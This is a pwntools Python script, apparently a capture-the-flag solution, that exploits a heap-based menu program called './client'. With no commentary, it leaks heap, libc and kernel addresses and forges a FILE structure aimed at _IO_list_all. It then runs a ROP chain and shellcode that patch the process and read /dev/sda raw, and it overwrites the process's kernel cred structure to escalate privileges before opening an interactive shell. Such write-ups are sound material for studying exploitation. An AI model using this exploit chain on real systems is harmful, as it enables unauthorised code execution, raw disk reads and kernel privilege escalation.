#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './client')
libc = ELF('./libc.so.6')

def start(argv=[], *a, **kw):
  if args.GDB:
    return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
  else:
    return process([exe.path] + argv, *a, **kw)

def make(name=None, data=p32(0x13379001), iss=0):
  if name is None: name = os.urandom(0x10)
  io.sendlineafter(b"choice: ", b"1")
  io.sendlineafter(b"name len: ", str(len(name)).encode())
  io.sendlineafter(b"name: ", name.hex().encode())
  io.sendlineafter(b"pic len: ", str(len(data)).encode())
  io.sendlineafter(b"pic: ", data.hex().encode())
  io.sendlineafter(b"save pic? ", str(iss).encode())

def free(idx, iss=0):
  io.sendlineafter(b"choice: ", b"2")
  io.sendlineafter(b"index: ", str(idx).encode())
  io.sendlineafter(b"delete pic? ", str(iss).encode())

def view(idx, iss=0, count=0):
  io.sendlineafter(b"choice: ", b"3")
  io.sendlineafter(b"index: ", str(idx).encode())
  io.sendlineafter(b"view pic? ", str(iss).encode())
  if iss: io.sendlineafter(b"count: ", str(count).encode()) ; io.recvline() ; return
  io.recvuntil(b'index: ')
  m = re.search(rb"(\d+), id: (\d+), name: (.+)", io.recvline())
  if not m: return None, None, None
  return int(m.group(1)), int(m.group(2)), m.group(3).strip()

def demangle(v):
  m = 0xfff << 52
  while m: v ^= (v & m) >> 12; m >>= 12
  return v

gdbscript = '''
init-pwndbg
c
'''.format(**locals())

while True:
  io = process(["/bin/sh", "./run.sh"])

  for i in range(5): make(name=b'A'*0x60)
  for i in range(5): free(i)
  for i in range(3): make(name=b'A'*0x60)
  free(0)
  free(1)
  make(name=b'A'*0x60)
  free(1)
  lo, up, _ = view(0)
  heap_base = (demangle(up<<32|lo)>>12)<<12
  log.info(f'{heap_base = :#014x}')
  for i in range(7+2): make(name=b'A'*0x60)
  for i in range(4, 10): free(i)
  free(2)
  free(3)
  free(1)
  io.sendlineafter(b"choice: ", b"2")
  io.sendlineafter(b"index: ", b'1'*0xfff)
  lo, up, _ = view(0)
  libc.address = (up<<32|lo) - 0x1e6b20
  log.info(f'{libc.address = :#014x}')
  make(name=b'A'*0x6c+p64(0x80|1)+b'A'*8)
  make(name=b'A'*0x40)
  for i in range(7): make(name=b'A'*0x60)
  make(name=b'A'*0x40)
  free(10)
  free(2)
  free(1)
  make(name=(b'A'*(4+8)+p64(0x60|1)+p64((libc.sym._IO_list_all-0x10)^(heap_base>>12))).ljust(0x60, b'\x00'))
  make(name=b'A'*0x40)
  make(name=(b'A'*4+p64(heap_base+0x9c0)).ljust(0x40, b'\x00'))

  '''
  0x0014acdc: push rax; pop rsp; lea rsi, [rax+0x48]; mov rax, [rdi+8]; jmp qword ptr [rax+0x18]
  0x001547be: add rsp, 0x110; pop rbx; pop rbp; pop r12; ret;

  0x0011ecf7: syscall; ret;
  0x0016032d: pop rsi; ret;
  0x00189481: pop rdi; ret;
  0x0011266f: pop rax; ret;
  0x00160234: pop rdx; pop rbx; ret;
  0x0015f4d9: pop rsp; ret;
  '''
  fs = flat({
      0x00: b'  sh',
      0x08: p64(heap_base+0x9c0+0x10-0x18),
      0x10: p64(libc.address+0x1547be),
      0x20: p64(0),
      0x28: p64(1),
      0x88: p64(libc.address+0x1e87a0),
      0xa0: p64(heap_base+0x9c0+0xe0),
      0xc0: p64(0),
      0xd8: p64(libc.sym._IO_wfile_jumps),
      0xe0+0x18: p64(0),
      0xe0+0x30: p64(0),
      0xe0+0xe0: p64(heap_base+0x9c0+0xe0+0xe8-0x68),
      0xe0+0xe8: p64(libc.address+0x14acdc),
  }, filler=b'\x00')

  rop  = flat([
      libc.address+0x189481, heap_base+0x1000,
      libc.address+0x16032d, 0x1000,
      libc.address+0x160234, 7, 0,
      libc.address+0x11266f, 10,
      libc.address+0x11ecf7,
      libc.address+0x15f4d9, heap_base+0x1010
  ])

  sc  = b''
  sc += asm('nop')*0x20
  sc += asm(f'''
    mov rax, qword ptr [rsp]
    mov rax, qword ptr [rax]
    sub rax, 208
    mov r12, rax
    mov rax, qword ptr [rax]
    sub rax, 0x4d40
    add rax, 0x1000
    mov r13, rax
    mov rdi, r13
    mov rsi, 0x2000
    mov rdx, 7
    mov rax, 10
    syscall
    mov rdi, 1
    mov rsi, qword ptr [rsp]
    mov rdx, 0x8
    mov rax, 1
    syscall
    mov qword ptr [rsp], r13
    lea rsi, qword ptr [rsp]
    mov rdx, 0x8
    mov rax, 1
    syscall
    mov rax, r13

    add rax, 0x8a9
    mov rdi, rax
    mov byte ptr [rdi], 0x48
    mov byte ptr [rdi+1], 0x31
    mov byte ptr [rdi+2], 0xc0
    mov byte ptr [rdi+3], 0xc3

    mov rax, r13
    add rax, 0x3d4
    mov rdi, rax
    mov byte ptr [rdi], 0x0

    mov rax, r13
    add rax, 0xdcc
    mov rdi, rax
    {"".join([f"mov byte ptr [rdi+{hex(x)}], 0xf0;" for x in [0x08, 0x15f, 0x1a4]])}
    {"".join([f"mov byte ptr [rdi+{hex(x)}], 0x0f;" for x in [0x1d,0x28,0x53,0x70,0x8f,0xb1,0xc6,0xcd,0xd4,0xda,0xf9,0x116,0x139,0x15a,0x16c,0x18f,0x196,0x1a0,0x1c1,0x1c8,0x1e2,0x1ff,0x21b]])}

    mov rax, r13
    add rax, 0xd7c
    mov rdi, rax
    mov byte ptr [rdi], 0x89
    mov byte ptr [rdi+1], 0xc1

    mov rax, r13
    add rax, 0x1188
    mov rdi, rax
    {"".join([f"mov byte ptr [rdi+{hex(i)}], {hex(b)};" for i, b in enumerate(asm(shellcraft.open('/dev/sda', 0) + shellcraft.read('rax', 'rsp', 0x1000) + shellcraft.write(1, 'rsp', 0x1000)))])}

    mov rax, r13
    add rax, 0x10e8
    mov rsp, r12
    add rsp, 8
    mov rbp, rsp
    sub rsp, 0x10
    push rax
    ret
  ''')
  sc  = sc.ljust((len(sc)+0x1f)//0x20*0x20, b'\x90')

  make(name=b'A'*4+fs+b'A'*0xb8+rop+b'\x00'*0x250)
  make(name=(b'A'*(0x64+144)+p64(heap_base+0x1020)+p64(libc.sym.environ)+sc).ljust(0x500, b'\x00'))
  io.sendlineafter(b"choice: ", b"4")

  sleep(1)
  io.recvline()
  stack = u64(io.recv(8))
  exe.address = u64(io.recv(8)) - 0x1000
  log.info(f'{stack = :#014x}')
  log.info(f'{exe.address = :#014x}')

  def make_chunk(data, pad=0): return p64(len(data)) + p64(pad) + data
  def make_pic(chunks): return p32(0x13379001) + b"".join(chunks)

  kbase = 0
  stable_leaks = {
      0x44cc0:  0x8137a0,
      0xa7e50: -0xb4f9f0,
      0xa7e10: -0xb4f9b0,
      0x47d80:  0x8106e0,
      0x939c0:  0x7c4aa0,
      0x02e00:  0x855660,
    }
  leaks = []
  with log.progress('hunting kleak') as p:
    for x in range(7):
      p.status(f'round {x+1}/7')
      for i in range(12): make(data=make_pic([make_chunk(b'\x00'*0x128+p64(0)+p64(0xefff)+p64(0))]), iss=1)
      view(x*12, iss=1, count=0)
      data = io.recvuntil(b'index: ', drop=True).strip()
      for j in range(0, len(data)//8*8, 8):
        val = u64(data[j:j+8])
        if val not in leaks and 0xffffffff80000000 < val < 0xffffffffc0000000: leaks.append(val)
      for val in leaks:
        l20 = val & 0xfffff
        if l20 in stable_leaks: kbase = val+stable_leaks[l20]-0x1858460 ; break
      if kbase != 0: p.success(f'{kbase = :#014x}') ; break
      else: continue
    else: p.failure('failed to get kleak')
  if kbase != 0: break
  io.close()

if args.GDB and not args.REMOTE:
  gdbinit = tempfile.NamedTemporaryFile(mode='w', delete=False, prefix=".debug_arm64_gdbinit_")
  gdbinit.write(f"""
init-gef-bata
target remote localhost:12345
ksymaddr-remote-apply
c
""")
  gdbinit.flush()
  gdbinit.close()
  subprocess.Popen(['qterminal', '-e', 'gdb', '-q', '-x', gdbinit.name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

idx = ((x+1)*12)
adj = {}
for i in range(9): make(data=make_pic([make_chunk(b''.ljust(0x130, b'\x00')+p64(0x140)+p64(0)+f'chunk-{i}'.encode())]), iss=1)
for i in range(9):
    view(idx+i, iss=1)
    data = io.recvuntil(b'index: ', drop=True).strip()
    m = re.match(rb'chunk-(\d+)', data)
    if m: adj[idx+int(m.group(1))] = idx+i 

log.info(f"adj: {adj}")
assert adj != {}

left, right = list(adj.keys())[0], adj[list(adj.keys())[0]]
init_task = kbase+0x01812940

free(left, iss=1)
make(data=make_pic([make_chunk(b''.ljust(0x128, b'\x00')+p64(init_task+0x37)+p64(0))]), iss=1)
view(right, iss=1)
_prev = u64(io.recvuntil(b'index: ', drop=True)[0x900-0x37-0x18+0x8+1:][:8])-0x900
_next = init_task+0x900
idx=left=idx+9-1

while True:
  free(left, iss=1)
  make(data=make_pic([make_chunk(b''.ljust(0x128, b'\x00')+p64(_prev+0x37)+p64(0))]), iss=1)
  view(right, iss=1)
  data  = io.recvuntil(b'index: ', drop=True)
  if b'client' in data[0xbf0-0x37-0x18:][:0x20]: task_struct = _prev ; break
  temp  = _prev+0x9000
  _prev = u64(data[data.index(p64(_next))+0x8:][:8])-0x900
  _next = temp

cred_struct = u64(data[data.index(b'client')-0x10:][:8])
log.info(f'{task_struct = :#014x}')
log.info(f'{cred_struct = :#014x}')

if args.GDB and not args.REMOTE:
  gdbinit = tempfile.NamedTemporaryFile(mode='w', delete=False, prefix=".debug_arm64_gdbinit_")
  gdbinit.write(f"""
init-gef-bata
target remote localhost:1234
ksymaddr-remote-apply
c
""")
  gdbinit.flush()
  gdbinit.close()
  subprocess.Popen(['qterminal', '-e', 'gdb', '-q', '-x', gdbinit.name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

free(left, iss=1)
make(data=make_pic([make_chunk(b''.ljust(0x128, b'\x00')+p64(0)+p64(0x140))]), iss=1)
for i in range(2): make(data=make_pic([make_chunk(b''.ljust(0x128, b'\x00'))]), iss=1)
free(right, iss=1)
free(left, iss=1)
make(data=make_pic([make_chunk(b''.ljust(0x1b0, b'\x00')+p64(task_struct-0x140))]), iss=1)
make(data=make_pic([make_chunk(b''.ljust(0x128, b'\x00'))]), iss=1)
make(data=make_pic([make_chunk(b'\x00'*0x128+p64(0x80000)+p64(0))]), iss=1)

left=idx+1 ; right=idx+2
free(idx, iss=1)
free(right, iss=1)
free(left, iss=1)

make(data=make_pic([make_chunk(b''.ljust(0x1b0, b'\x00')+p64(cred_struct-0x120))]), iss=1)
make(data=make_pic([make_chunk(b''.ljust(0x128, b'\x00'))]), iss=1)
make(data=make_pic([make_chunk(b''.ljust(0x108, b'\x00')+p64(2)+b'\x00'*0x28)]), iss=1)

io.sendlineafter(b"choice: ", b"4")
io.interactive()
